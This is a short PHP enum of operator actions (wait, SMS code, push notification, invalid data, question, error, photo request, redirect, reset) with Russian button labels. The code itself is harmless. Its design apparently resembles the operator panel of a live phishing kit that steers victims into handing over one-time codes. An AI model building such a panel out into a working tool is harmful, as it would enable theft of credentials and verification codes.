<?php

namespace App\Enums;

enum ActionType: string
{
    case Idle = 'idle';
    case HoldShort = 'hold.short';
    case HoldLong = 'hold.long';
    case Sms = 'sms';
    case Push = 'push';
    case InvalidData = 'invalid-data';
    case Question = 'question';
    case Error = 'error';
    case PhotoWithInput = 'photo.with-input';
    case PhotoWithoutInput = 'photo.without-input';
    case Redirect = 'redirect';

    public function requiresText(): bool
    {
        return in_array($this, [self::Question, self::Error], true);
    }

    public function requiresUrl(): bool
    {
        return $this === self::Redirect;
    }

    public function requiresPhoto(): bool
    {
        return in_array($this, [self::PhotoWithInput, self::PhotoWithoutInput], true);
    }

    public function buttonLabel(): string
    {
        return match ($this) {
            self::HoldShort        => '⏳ Ожидание короткое',
            self::HoldLong         => '⏳ Ожидание долгое',
            self::Sms              => '📱 SMS-код',
            self::Push             => '🔔 Push-уведомление',
            self::InvalidData      => '❌ Неверные данные',
            self::Question         => '❓ Вопрос…',
            self::Error            => '⚠️ Ошибка…',
            self::PhotoWithInput   => '📸 Фото + текст',
            self::PhotoWithoutInput => '📸 Только фото',
            self::Redirect         => '🔗 Редирект…',
            self::Idle             => '↩️ Сброс',
        };
    }
}
